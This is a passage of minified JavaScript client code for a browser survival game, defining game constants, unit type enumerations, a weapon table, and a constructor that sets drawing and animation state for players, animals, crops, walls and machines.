                    items: [[1, Be.BAG], [1, Be.PICK_GOLD], [1, Be.CAKE], [1, Be.BOTTLE_FULL], [3, Be.BIG_FIRE], [3, Be.BANDAGE], [1, Be.GOLD_HELMET], [1, Be.SWORD_GOLD], [1, Be.DIAMOND_SPEAR], [2, Be.GOLD_SPIKE], [50, Be.STONE], [100, Be.WOOD]]
                }]
                , i2 = {
                    VERSION_NUMBER: 52,
                    TIMEOUT_TIME: 2e3,
                    TIMEOUT_NUMBER: 3,
                    PING: "[13]",
                    PING_DELAY: 6e4,
                    ROTATE: .2,
                    ATTACK: .2,
                    SLOW_ATTACK: .58,
                    CAM_DELAY: 50,
                    MUTE_DELAY: 125e3,
                    TIMEOUT_SERVER: 6e5,
                    WAITING_FOR_SERVER: 8e3,
                    DELAY_CONNECTION_UPDATE: 5,
                    LAG_DISTANCE: 200,
                    LOOSE_FOCUS: 15,
                    TOKEN_LEN: 14,
                    TEAM_MANAGE: 0,
                    TEAM_SHOW: 1,
                    TEAM_LEAVE: 2,
                    TEAM_JOIN: 3,
                    TEAM_FULL: 4,
                    SKIN_MAX: 20,
                    ACCESSORY_MAX: 14,
                    SYMBOL_MAX: 4
                };
            var Ue = {
                DAY: 48e4,
                WITHOUT_BAG: 10,
                WITH_BAG: 16,
                BAG_SIZE: 6,
                GHOST_DELAY: 6e4,
                TOP: 1,
                BOTTOM: 2,
                LEFT: 4,
                RIGHT: 8,
                ROTATE: 10,
                DIST_CHEST: 100,
                DIST_FURNACE: 100,
                DIST_WINDMILL: 100,
                DIST_WELL: 100,
                DIST_BREAD_OVEN: 100,
                DIST_SIGN: 100,
                DIST_TOTEM: 100,
                DIST_RESURRECTION: 100,
                DIST_EXTRACTOR_MACHINE: 100,
                MODE_PVP: 0,
                MODE_HUNGER_GAMES: 1,
                MODE_ZOMBIES: 2,
                MODE_VAMPIRES: 3,
                MODE_LEGACY: 4,
                MODE_BR: 5,
                MODE_COMMUNITY: 6,
                MODE_EXPERIMENTAL: 7,
                ZOMBIE_SKIN: 0,
                VAMPIRE_SKIN: 0,
                ROBOT_SKIN: 30,
                GHOST: 2,
                WT1SY: 0,
                LWT1SY: 0,
                WT1EY: 50,
                WT2SY: 0,
                LWT2SY: 40,
                WT2EY: 39,
                LWT2: 830,
                FLOAM_X: 25,
                FLOAM_Y: 8,
                W1SX: 0,
                LW1SX: 0,
                W1EX: 200,
                W2SX: 0,
                LW2SX: 250,
                W2EX: 150,
                W3SX: 0,
                LW3SX: 350,
                W3EX: 100,
                LSANDX: 700,
                SEED: 39879
            }
                , n2 = [];
            for (Ze = 0; Ze < 500; Ze++)
                n2[Ze] = 0;
            n2[ze.SUPER_DIVING_SUIT] = 1,
                n2[ze.SWORD_WOOD] = 1,
                n2[ze.SWORD] = 1,
                n2[ze.SWORD_GOLD] = 1,
                n2[ze.SWORD_DIAMOND] = 1,
                n2[ze.SWORD_AMETHYST] = 1,
                n2[ze.REIDITE_SWORD] = 1,
                n2[ze.PIRATE_SWORD] = 1,
                n2[ze.DRAGON_SWORD] = 1,
                n2[ze.LAVA_SWORD] = 1,
                n2[ze.SPEAR] = 1,
                n2[ze.GOLD_SPEAR] = 1,
                n2[ze.DIAMOND_SPEAR] = 1,
                n2[ze.AMETHYST_SPEAR] = 1,
                n2[ze.REIDITE_SPEAR] = 1,
                n2[ze.DRAGON_SPEAR] = 1,
                n2[ze.LAVA_SPEAR] = 1,
                n2[ze.WOOD_SPEAR] = 1,
                n2[ze.CRAB_SPEAR] = 1;
            var r2 = [{
                time: 288e4
            }, {
                time: 144e4
            }, {
                time: 192e4
            }, {
                time: 144e4
            }, {
                time: 288e4
            }, {
                time: 24e5
            }, {
                time: 24e5
            }, {
                time: 48e5
            }, {
                time: 288e4
            }, {
                time: 336e4
            }, {
                time: 288e4
            }, {
                time: 384e4
            }, {
                time: 336e4
            }]
                , Ye = {
                    PLAYERS: 0,
                    FIRE: 1,
                    WORKBENCH: 2,
                    SEED: 3,
                    WALL: 4,
                    SPIKE: 5,
                    BIG_FIRE: 6,
                    STONE_WALL: 7,
                    GOLD_WALL: 8,
                    DIAMOND_WALL: 9,
                    WOOD_DOOR: 10,
                    CHEST: 11,
                    STONE_SPIKE: 12,
                    GOLD_SPIKE: 13,
                    DIAMOND_SPIKE: 14,
                    STONE_DOOR: 15,
                    GOLD_DOOR: 16,
                    DIAMOND_DOOR: 17,
                    FURNACE: 18,
                    AMETHYST_WALL: 19,
                    AMETHYST_SPIKE: 20,
                    AMETHYST_DOOR: 21,
                    RESURRECTION: 22,
                    EMERALD_MACHINE: 23,
                    EXTRACTOR_MACHINE_STONE: 24,
                    EXTRACTOR_MACHINE_GOLD: 25,
                    EXTRACTOR_MACHINE_DIAMOND: 26,
                    EXTRACTOR_MACHINE_AMETHYST: 27,
                    EXTRACTOR_MACHINE_REIDITE: 28,
                    TOTEM: 29,
                    BRIDGE: 30,
                    WHEAT_SEED: 31,
                    WINDMILL: 32,
                    PLOT: 33,
                    BREAD_OVEN: 34,
                    WELL: 35,
                    SIGN: 36,
                    PUMPKIN_SEED: 37,
                    ROOF: 38,
                    GARLIC_SEED: 39,
                    THORNBUSH_SEED: 40,
                    BED: 41,
                    GARLAND: 42,
                    TOMATO_SEED: 43,
                    CARROT_SEED: 44,
                    WOOD_DOOR_SPIKE: 45,
                    STONE_DOOR_SPIKE: 46,
                    GOLD_DOOR_SPIKE: 47,
                    DIAMOND_DOOR_SPIKE: 48,
                    AMETHYST_DOOR_SPIKE: 49,
                    REIDITE_WALL: 50,
                    REIDITE_DOOR: 51,
                    REIDITE_SPIKE: 52,
                    REIDITE_DOOR_SPIKE: 53,
                    WATERMELON_SEED: 54,
                    ALOE_VERA_SEED: 55,
                    WOOD_TOWER: 56,
                    WOLF: 60,
                    SPIDER: 61,
                    FOX: 62,
                    BEAR: 63,
                    DRAGON: 64,
                    PIRANHA: 65,
                    KRAKEN: 66,
                    CRAB: 67,
                    FLAME: 68,
                    LAVA_DRAGON: 69,
                    BOAR: 70,
                    CRAB_BOSS: 71,
                    BABY_DRAGON: 72,
                    BABY_LAVA: 73,
                    HAWK: 74,
                    VULTURE: 75,
                    SAND_WORM: 76,
                    BABY_MAMMOTH: 77,
                    MAMMOTH: 78,
                    WHEAT_MOB: 79,
                    RABBIT: 80,
                    TREASURE_CHEST: 81,
                    DEAD_BOX: 82,
                    PUMPKIN_MOB: 83,
                    GARLIC_MOB: 84,
                    THORNBUSH_MOB: 85,
                    CRATE: 86,
                    GIFT: 87,
                    PENGUIN: 88,
                    ALOE_VERA_MOB: 89,
                    FIREFLY: 90,
                    SPELL: 91,
                    FRUIT: 100
                }
                , o2 = [[Ye.EXTRACTOR_MACHINE_STONE, Be.STONE], [Ye.EXTRACTOR_MACHINE_GOLD, Be.GOLD], [Ye.EXTRACTOR_MACHINE_DIAMOND, Be.DIAMOND], [Ye.EXTRACTOR_MACHINE_AMETHYST, Be.AMETHYST], [Ye.EXTRACTOR_MACHINE_REIDITE, Be.REIDITE]];
            function a2() {
                this.nickname = "",
                    this.skin = 0,
                    this.accessory = 0,
                    this.bag = 0,
                    this.baglook = 0,
                    this.book = 0,
                    this.crate = 0,
                    this.dead = 0,
                    this.level = 0,
                    this.label = null,
                    this.label_winter = null,
                    this.ldb_label = null,
                    this.alive = !1,
                    this.score = 0
            }
            function s2(e, t, i, n, r, o, a, s, _, E) {
                switch (this.type = e,
                this.pid = t,
                this.id = i,
                this.x = n,
                this.y = r,
                this.angle = o,
                this.nangle = o,
                this.action = a,
                this.info = s,
                this.extra = E,
                this.r = {
                    x: n,
                    y: r
                },
                this.speed = _,
                Fe && (this.uid = t * Fe.max_units + i),
                e) {
                    case Ye.PLAYERS:
                        this.ally = xe.id === this.pid || A0(this.pid),
                            this.player = Fe.players[this.pid],
                            this.skin = this.player.skin,
                            this.baglook = this.player.baglook,
                            this.book = this.player.book,
                            this.accessory = this.player.accessory,
                            this.dist_forest = -1e6,
                            this.dist_lava = -1e6,
                            this.dist_winter = -1e6,
                            this.dist_desert = -1e6,
                            this.dist_water = -1e6,
                            this.dist_sand = -1e6,
                            this.dist_dragon = -1e6,
                            this.zombie = Fe.mode === Ue.MODE_ZOMBIES && this.skin === Ue.ZOMBIE_SKIN,
                            this.vampire = Fe.mode === Ue.MODE_VAMPIRES && this.skin === Ue.VAMPIRE_SKIN,
                            this.superzombie = !(!this.zombie || "  " !== this.player.nickname),
                            this.foot = [],
                            this.tower = 0,
                            this.move_effect = !0,
                            this.id_foot = 0,
                            this.fly = 0,
                            this.swim = [],
                            this.r = {
                                x: n,
                                y: r
                            },
                            this.draw = ur,
                            this.draw_vehicle = _r,
                            this.vehicle_fx1 = 0,
                            this.vehicle_fx2 = 0,
                            this.vehicle_fx3 = 0,
                            this.vehicle_fx4 = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 6, .5, 1),
                            this.vehicle_fx5 = 0,
                            this.tower_fx = 0,
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3),
                            this.heal = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3),
                            this.freeze = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3),
                            this.starve = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3),
                            this.idle = new Utils.LinearAnimation(!0, 0, 2.25, -1.5, 3.75, 7.5),
                            this.walk = new Utils.LinearAnimation(!0, 0, 7.5, -3, 22.5, 33.75),
                            this.attack = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 3, 6, 9),
                            this.slow_attack = 0,
                            this.web = new Utils.LinearAnimation(!1, .6, .6, 0, 1, 3),
                            this.move_head = this.superzombie ? new Utils.LinearAnimation(!0, 0, 2.25, -1.5, 2.75, 5.5) : 0,
                            this.angle_init = 0,
                            this.text_ease = 0,
                            this.text_effect = [],
                            this.text_move = [],
                            this.text = [],
                            this.label = [],
                            this.draw_text = hr,
                            this.hand = !0,
                            this.right = -1,
                            this.vehicle = -1,
                            this.action = R.IDLE,
                            this.collide = !1,
                            this.clothe = 0,
                            this.ghost = !1,
                            this.bubbles = [],
                            this.bag = 0,
                            this.sid = -1,
                            this.update = function (e) {
                                32768 & this.info ? (this.collide = !0,
                                    this.info = -32769 & this.info) : this.collide = !1,
                                    16384 & this.info ? (this.info = -16385 & this.info,
                                        this.bag = 1) : this.bag = 0,
                                    this.clothe = Math.floor(this.info / 128),
                                    this.info -= 128 * this.clothe,
                                    this.info === Be.HAND || this.superzombie ? this.right = -1 : this.right = this.info,
                                    this.tower = Fe.find_tower(Math.floor(this.r.y / 100), Math.floor(this.r.x / 100)),
                                    this.vehicle = 255 & this.extra,
                                    this.right === Ue.GHOST ? this.ghost = !0 : this.ghost = !1,
                                    n2[this.right] ? this.weapon = !0 : this.weapon = !1,
                                    e & R.WEB ? (this.web.o = !1,
                                        this.web.v = .6) : e & R.COLD ? (this.freeze.o = !1,
                                            this.freeze.v = .6) : e & R.HEAL && (this.heal.o = !1,
                                                this.heal.v = .6),
                                    e & R.HUNGER && (this.starve.o = !1,
                                        this.starve.v = .6),
                                    e & R.HURT && (this.hit.o = !1,
                                        this.hit.v = .6),
                                    e & R.ATTACK && (this.slow_attack = i2.SLOW_ATTACK,
                                        Xe.run) && -1 !== this.sid && Xe.players[this.sid].swing(H2[this.right])
                            }
                            ,
                            this.update();
                        break;
                    case Ye.EMERALD_MACHINE:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw_bg = ir,
                            this.draw_fg = er,
                            this.halo = new Utils.LinearAnimation(!1, 1, 1.23, 1.18, .01, .01),
                            this.rotate1 = 0,
                            this.rotate2 = 0,
                            this.draw_life = rn;
                        break;
                    case Ye.RESURRECTION:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw_bg = nr,
                            this.draw_fg = tr,
                            this.halo = new Utils.LinearAnimation(!1, 1, 1.23, 1.18, .01, .01),
                            this.rotate1 = 0,
                            this.rotate2 = 0;
                        break;
                    case Ye.FIRE:
                    case Ye.BIG_FIRE:
                        this.draw_bg = Yn,
                            this.draw_fg = or,
                            this.fire = new Utils.LinearAnimation(!1, 1, 1.03, .98, .3, .3),
                            this.ground = new Utils.LinearAnimation(!1, 1, 1.23, 1.18, .01, .01),
                            this.halo = new Utils.LinearAnimation(!1, 1, 1.23, 1.18, .01, .01),
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.TOMATO_SEED:
                        this.draw_bg = Wn,
                            this.draw_fg = Vn,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2),
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
                            this.fruits = [];
                        for (var u = 0; u < 3; u++)
                            this.fruits.push({
                                draw: vn,
                                breath: new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2)
                            });
                        this.fruits[0].x = this.x - 16.5,
                            this.fruits[0].y = this.y - 15.5,
                            this.fruits[0].angle = this.angle,
                            this.fruits[1].x = this.x + 36,
                            this.fruits[1].y = this.y + 17,
                            this.fruits[1].angle = this.angle,
                            this.fruits[2].x = this.x - 18.5,
                            this.fruits[2].y = this.y + 39,
                            this.fruits[2].angle = this.angle;
                        break;
                    case Ye.SEED:
                        for (this.draw_bg = Bn,
                            this.draw_fg = wn,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2),
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
                            this.fruits = [],
                            u = 0; u < 3; u++)
                            this.fruits.push({
                                draw: Mn,
                                breath: new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2)
                            });
                        this.fruits[0].x = this.x - 16.5,
                            this.fruits[0].y = this.y - 15.5,
                            this.fruits[1].x = this.x - 5.5,
                            this.fruits[1].y = this.y + 7.5,
                            this.fruits[2].x = this.x + 18,
                            this.fruits[2].y = this.y - 5;
                        break;
                    case Ye.BABY_MAMMOTH:
                        this.draw = Rn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.BOAR:
                        this.draw = Cn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.CRAB_BOSS:
                        this.draw = bn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.breathl = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.breathr = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3),
                            this.heal = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.CRAB:
                        this.draw = Nn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.breathl = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.breathr = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3),
                            this.heal = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.FLAME:
                        this.draw = Dn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.FIREFLY:
                        this.draw = mn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .5, .5),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.SPELL:
                        this.spell = this.info,
                            this.fly = this.extra,
                            this.born = 0,
                            this.draw = Sn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .6, .6);
                        break;
                    case Ye.RABBIT:
                    case Ye.WOLF:
                    case Ye.SPIDER:
                    case Ye.FOX:
                    case Ye.BEAR:
                    case Ye.MAMMOTH:
                    case Ye.PIRANHA:
                    case Ye.KRAKEN:
                    case Ye.PENGUIN:
                        this.draw = mn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.SIGN:
                        this.draw = Fn,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.BREAD_OVEN:
                        this.draw_fg = Un,
                            this.draw = xn,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
                            this.up = new Utils.LinearAnimation(!1, 1, 1.03, .98, .1, .1),
                            this.smog = [];
                        break;
                    case Ye.GIFT:
                        this.angle = Math.random() * Math.PI / 2;
                    case Ye.CRATE:
                    case Ye.DEAD_BOX:
                        this.draw = gn,
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.TREASURE_CHEST:
                        this.draw = pn,
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.LAVA_DRAGON:
                        this.scale = 1,
                            this.draw = cn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.rotate = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 6, .5, 1),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.SAND_WORM:
                        this.dig = 0,
                            this.ground = [],
                            this.groundTimer = 0,
                            this.draw_ground = dn,
                            this.draw = Tn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.rotate = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 6, .5, 1),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.VULTURE:
                        this.x = this.info,
                            this.y = this.extra,
                            this.scale = 1,
                            this._alpha = 0,
                            this.draw = An,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.rotate = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 6, .5, 1),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.HAWK:
                        this.x = this.info,
                            this.y = this.extra,
                            this.scale = 1,
                            this._alpha = 0,
                            this.draw = hn,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.rotate = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 6, .5, 1),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.BABY_LAVA:
                        this.scale = 1,
                            this.draw = ln,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.rotate = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 6, .5, 1),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.BABY_DRAGON:
                        this.scale = 1,
                            this.draw = In,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.rotate = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 6, .5, 1),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.DRAGON:
                        this.scale = 1,
                            this.draw = On,
                            this.breath = new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2),
                            this.rotate = new Utils.LinearAnimation(!1, 0, 0, -Math.PI / 6, .5, 1),
                            this.hit = new Utils.LinearAnimation(!1, .6, .6, 0, 5, 3);
                        break;
                    case Ye.FRUIT:
                        for (this.fruits = [],
                            u = 0; u < 5; u++)
                            this.fruits.push({
                                draw: Mn,
                                breath: new Utils.LinearAnimation(!1, .9 + .15 * Math.random(), 1.05, .9, .2, .2)
                            });
                        switch (this.id % 3) {
                            case 0:
                                this.fruits[0].x = this.x - 20.5,
                                    this.fruits[0].y = this.y - 22.5,
                                    this.fruits[1].x = this.x - 35.5,
                                    this.fruits[1].y = this.y + 7.5,
                                    this.fruits[2].x = this.x + 7.5,
                                    this.fruits[2].y = this.y - 30,
                                    this.fruits[3].x = this.x + 22.5,
                                    this.fruits[3].y = this.y,
                                    this.fruits[4].x = this.x - 7.5,
                                    this.fruits[4].y = this.y + 14.5;
                                break;
                            case 1:
                                this.fruits[0].x = this.x - 30.5,
                                    this.fruits[0].y = this.y - 22.5,
                                    this.fruits[1].x = this.x - 15.5,
                                    this.fruits[1].y = this.y + 7.5,
                                    this.fruits[2].x = this.x + 15.5,
                                    this.fruits[2].y = this.y - 30,
                                    this.fruits[3].x = this.x + 12.5,
                                    this.fruits[3].y = this.y + 5,
                                    this.fruits[4].x = this.x - 40.5,
                                    this.fruits[4].y = this.y + 14.5;
                                break;
                            case 2:
                                this.fruits[0].x = this.x - 20.5,
                                    this.fruits[0].y = this.y - 20.5,
                                    this.fruits[1].x = this.x - 35.5,
                                    this.fruits[1].y = this.y + 15.5,
                                    this.fruits[2].x = this.x + 7.5,
                                    this.fruits[2].y = this.y - 17,
                                    this.fruits[3].x = this.x + 22.5,
                                    this.fruits[3].y = this.y + 5,
                                    this.fruits[4].x = this.x - 7.5,
                                    this.fruits[4].y = this.y + 1.5
                        }
                        break;
                    case Ye.WHEAT_SEED:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw = zn,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2),
                            this.wind = new Utils.LinearAnimation(!1, 0, Math.PI / 30, -Math.PI / 30, .06, .06);
                        break;
                    case Ye.THORNBUSH_SEED:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw = fn,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2);
                        break;
                    case Ye.GARLIC_SEED:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw = Ln,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2);
                        break;
                    case Ye.CARROT_SEED:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw = Hn,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2);
                        break;
                    case Ye.ALOE_VERA_SEED:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw = Gn,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2);
                        break;
                    case Ye.WATERMELON_SEED:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw = yn,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2);
                        break;
                    case Ye.PUMPKIN_SEED:
                        this.hit = {
                            anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                            update: !1,
                            angle: 0
                        },
                            this.draw = Pn,
                            this.ground = new Utils.LinearAnimation(!1, .9, 1.05, .9, .2, .2);
                        break;
                    case Ye.EXTRACTOR_MACHINE_STONE:
                        this.draw = Xn,
                            this.rotate = 0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.EXTRACTOR_MACHINE_GOLD:
                        this.draw = jn,
                            this.rotate = 0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.EXTRACTOR_MACHINE_DIAMOND:
                        this.draw = qn,
                            this.rotate = 0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.EXTRACTOR_MACHINE_AMETHYST:
                        this.draw = Zn,
                            this.rotate = 0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.EXTRACTOR_MACHINE_REIDITE:
                        this.draw = Qn,
                            this.rotate = 0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.WINDMILL:
                        this.draw_bg = $n,
                            this.draw_fg = Jn,
                            this.rotate = 0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.ROOF:
                        this.draw = on,
                            this.j = Math.floor(this.x / 100),
                            this.i = Math.floor(this.y / 100),
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
                            this.opacity = 1,
                            this.draw_life = nn;
                        break;
                    case Ye.GARLAND:
                        this.draw = an,
                            this.halo = new Utils.LinearAnimation(!1, 1, 1.15, 1, .3, .3),
                            this.color = 0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.PLOT:
                    case Ye.WORKBENCH:
                    case Ye.WOOD_TOWER:
                    case Ye.WELL:
                    case Ye.TOTEM:
                        29 === this.type && l0(this.pid) && (T0.x = this.x,
                            T0.y = this.y),
                            this.draw = _n,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        break;
                    case Ye.BRIDGE:
                        this.draw = _n,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
                            this.draw_life = nn;
                        break;
                    case Ye.WALL:
                    case Ye.STONE_WALL:
                    case Ye.GOLD_WALL:
                    case Ye.DIAMOND_WALL:
                    case Ye.AMETHYST_WALL:
                    case Ye.REIDITE_WALL:
                    case Ye.SPIKE:
                    case Ye.STONE_SPIKE:
                    case Ye.GOLD_SPIKE:
                    case Ye.DIAMOND_SPIKE:
                    case Ye.AMETHYST_SPIKE:
                    case Ye.REIDITE_SPIKE:
                        this.ally = xe.id === this.pid || A0(this.pid),
                            this.draw = _n,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
                            this.draw_life = rn;
                        break;
                    case Ye.BED:
                        this.draw = sn,
                            this.opacity = 1,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            };
                        var d = this.angle % (Math.PI / 2);
                        d < Math.PI / 4 ? this.angle -= d : this.angle += Math.PI / 2 - d;
                        break;
                    case Ye.WHEAT_MOB:
                        this.draw = tn,
                            this.angle = Math.random() * Math.PI * 2;
                        break;
                    case Ye.ALOE_VERA_MOB:
                        this.draw = en,
                            this.angle = Math.random() * Math.PI * 2;
                        break;
                    case Ye.PUMPKIN_MOB:
                        this.draw = $0,
                            this.angle = Math.random() * Math.PI * 2;
                        break;
                    case Ye.GARLIC_MOB:
                        this.draw = Q0,
                            this.angle = Math.random() * Math.PI * 2;
                        break;
                    case Ye.THORNBUSH_MOB:
                        this.draw = Z0,
                            this.angle = Math.random() * Math.PI * 2;
                        break;
                    case Ye.CHEST:
                        this.update = function (e) {
                            this.lock = 8192 & this.info ? 1 : 0,
                                this.info = 8191 & this.info,
                                this.action = e
                        }
                            ,
                            this.draw = q0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
                            this.lock = 0,
                            this.update(this.action);
                        break;
                    case Ye.WOOD_DOOR_SPIKE:
                    case Ye.STONE_DOOR_SPIKE:
                    case Ye.GOLD_DOOR_SPIKE:
                    case Ye.DIAMOND_DOOR_SPIKE:
                    case Ye.AMETHYST_DOOR_SPIKE:
                    case Ye.REIDITE_DOOR_SPIKE:
                    case Ye.WOOD_DOOR:
                    case Ye.STONE_DOOR:
                    case Ye.GOLD_DOOR:
                    case Ye.DIAMOND_DOOR:
                    case Ye.AMETHYST_DOOR:
                    case Ye.REIDITE_DOOR:
                        this.ally = xe.id === this.pid || A0(this.pid),
                            this.draw = j0,
                            this.hit = {
                                anim: new Utils.LinearAnimation(!1, 1, 1, 0, 10, 10),
                                update: !1,
                                angle: 0
                            },
